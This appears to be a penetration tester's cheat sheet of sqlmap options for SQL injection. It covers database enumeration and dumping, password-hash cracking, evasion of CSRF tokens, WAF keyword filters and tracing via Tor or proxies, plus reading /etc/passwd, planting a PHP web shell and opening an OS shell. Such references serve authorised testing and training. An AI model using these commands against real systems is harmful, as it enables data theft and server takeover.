#################### HELP ####################
-h
-hh                                              EXTENDED HELP



#################### REQUEST ####################
-H "<header>"                                    SET A HEADER
--method PUT                                     SET REQUEST METHOD
--data 'uid=1&name=test'                         SET POST DATA
--cookie=                                        SET A COOKIE SESSION
-r                                               USE A STORED REQUEST FILE
-A                                               SET USER AGENT
--random-agent                                   SET RANDOM USER AGENT
--mobile                                         SET A MOBILE USER AGENT



#################### PAYLOADS ####################
--technique=BEU
B: Boolean-based blind
E: Error-based
U: Union query-based
S: Stacked queries
T: Time-based blind
Q: Inline queries



#################### FUUZING ####################
-p                                               ONLY FUZZ THIS PARAMETER
--cookie=id=*                                    FUZZ THE COOKIE



#################### USEFULL ####################
--batch                                           DONT ASK USER ANYTHING, JUST USER STANDART
--proxy                                           USING A WEBPROXY LIKE BURP
--flush-session                                   FLUSHES COLLECTED DATA



#################### ERROR HANDLING ####################
--parse-errors                                    SHOW PARSE ERRORS
-t /tmp/traffic.txt                               STORES EVERY REQUEST AND RESPONSE MADE BY SQLMAP
-v 6                                              VERBOSE OUTPUT
--code=200                                        DETERMINE TRUE/FALSE BY HTML CODE
--titles=                                         DETERMINE TRUE/FALSE BY HTML <title>
--string=success                                  DETERMINE TRUE/FALSE BY HTML STRING
--text-only                                       DETERMINE TRUE/FALSE BY VISIBLE ONLY, NOT SOURCE CODE
--union-cols=17                                   SET COLUMNS TO 17, ONLY UNION BASED
--union-char='a'                                  SET ALTERNATIVE VALUE, STANDART IS RANDOM INTEGER
--union-from=users                                APPENDIX AT THE END OF THE UNION QUERY, E.G. ORACLE



#################### BOUNDARIES ####################
--level=5                                         THE HIGHER THE MORE EXTENDED VECTORS/BOUNDARIES
--risk=3                                          EXTENDS THE USED VECTORS BASED ON THEIR RISK
--prefix="%'))"                                   ENCLOSES AFTER THE PARAMETER, % IS RECOMMENDED
--suffix="-- -"                                   ENCLOSES AFTER THE VECTOR



#################### ENUMERATION ####################
--schema                                          BEST OVERVIEW
--dbs                                             SHOWS ONLY DATABASES
-D webshop --tables                               SHOWS TABLENAMES OF WEBSHOP
-D webshop -T users --columns                     SHOWS COLUMNS OF WEBSHOP/USERS
--banner                                          DB VERSION BANNER
--current-user                                    CURRENT USER NAME
--current-db                                      CURRENT DB NAME
--hostname                                        HOSTNAME
--passwords                                       SEARCHES PW HASHES
--is-dba                                          IS CURRENT USER DB-ADMIN? (DB-ADMIN DOESNT MEAN OS-ADMIN)
--search -T user                                  SEARCH FOR THE TABLES "USER" IN ALL DATABASES
--search -C pass                                  SEARCH FOR THE COLUMN "PASS" IN ALL DATABASES
--passwords                                       SEARCH AND CRACK SYSTEMTABLES HASHES



#################### DUMPING ####################
-D webshop -T users -C username,email --dump          DUMPS ONLY USERNAME, EMAIL
-D testdb -T users --start=2 --stop=3 --dump          DUMPS BETWEEN ID 2 AND ID 3
-D testdb -T users --where="name LIKE 'f%'" --dump    DUMPS NAME BEGINNING WITH F   
--dump                                                DUMP CURRENT DATABASE
--dump-all                                            DUMP ALL DATABASES
--dump-all --exclude-sysdbs                           DUMP ALL DATABASES EXCEPT SYSDBS
--batch --all                                         ENUMERATION, DUMP ALL, CRACKING, OS COMMAND EXECUTION ETC
--dump-format                                         STANDART IS .CSV. OPTIONS: HTML, SQLITE



#################### BYPASSING PROTECTION MECHANISMS ####################
--random-agent                                                                                                                   SET RANDOM USER AGENT
--data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"                                              BYPASS ANTI-CSRF TOKEN
--randomize=<PARAMETER NAME>                                                                                                     BYPASSES UNIQUE VALUE
-u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"      BYPASSING CALCULATED PARAMETER
--proxy="socks4://177.39.187.70:33283"                                                                                           ADDS A PROXY
--proxy-file                                                                                                                     ADDS A PROXY LIST
--tor                                                                                                                            USES TOR
--check-tor                                                                                                                      CHECKS IF TOR WORKS PROPERLY
--list-tampers                                                                                                                   LISTS TEMPER SCRIPTS
--tamper=between,randomcase                                                                                                      USING TAMPER SCRIPTS
--chunked                                                                                                           SPLITS POST REQ BODY IN CHUNKS TO BYPASS BLACKLISTED KEYWORDS
--hpp                                                                                                               EXAMPLE: ?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users



#################### ATTACKING THE OS ####################
--file-read "/etc/passwd"                                                       FILE READ
--file-write "shell.php" --file-dest "/var/www/html/shell.php"                  FILE WRITE, AFTER WRITING CURL THE SHELL
--os-shell                                                                      GET A SHELL, IF IT DOESNT WORK TRY --technique=E

